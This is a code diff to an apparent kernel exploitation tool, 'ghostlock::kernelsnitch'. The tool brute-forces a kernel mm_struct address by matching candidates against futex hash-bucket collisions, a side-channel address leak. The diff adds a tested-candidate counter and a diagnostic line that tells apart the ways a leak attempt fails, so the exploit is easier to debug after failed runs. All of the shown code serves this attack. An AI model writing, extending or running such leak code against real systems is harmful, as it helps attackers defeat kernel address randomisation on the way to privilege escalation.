@@ -104,6 +104,13 @@ namespace ghostlock::kernelsnitch {
         pthread_t *tids;
         size_t identity_diff;
 
+        /* v12.1: brute-force forensics. cand_tested counts matcher calls
+         * (racy increments are fine — diagnostics, not control flow); the
+         * rest snapshot the geometry the scan actually used, so a 0-match
+         * run distinguishes "range empty", "candidate out of range", and
+         * "observed set is noise" without another panic. */
+        volatile size_t cand_tested;
+
         enum kernelsnitch_state state;
     };
 
@@ -225,6 +232,7 @@ namespace ghostlock::kernelsnitch {
     };
 
     static int32_t __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate) {
+        ks->cand_tested++;
         for (size_t i = 1; i < ks->collisions; ++i) {
             if (futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[0], candidate) !=
                 futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate))
@@ -688,12 +696,26 @@ namespace ghostlock::kernelsnitch {
         if (ks->verbose) pr_info("start bruteforcing\n");
         ghostlock::kernel::reset_cpu_pin();
 
+        ks->cand_tested = 0;
         __run_mm_leak_pass(ks, 1, 0);
         if (!ks->found) {
             ks->mm_progress = 0;
             __run_mm_leak_pass(ks, 0, 1);
         }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+        if (ks->state == KERNELSNITCH_MM_NOT_FOUND) {
+            /* v12.1: one line that distinguishes the three failure classes —
+             * cand_tested==0 (range empty), full scan with no match
+             * (candidate out of range, or the observed set is timing noise),
+             * and the geometry the scan assumed. */
+            pr_info("ks diag: cand=%zu id_diff=%zx tbl=%zu coll=%zu "
+                    "a0=%zx a1=%zx a2=%zx mm_sz=%zx slab=%zu\n",
+                    ks->cand_tested, ks->identity_diff,
+                    ks->futex_hash_table_size, ks->collisions,
+                    ks->futex_addrs[0], ks->futex_addrs[1],
+                    ks->collisions > 2 ? ks->futex_addrs[2] : 0,
+                    ks->mm_struct_sz, (size_t) ks->mm_slab_order);
+        }
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
     }
 
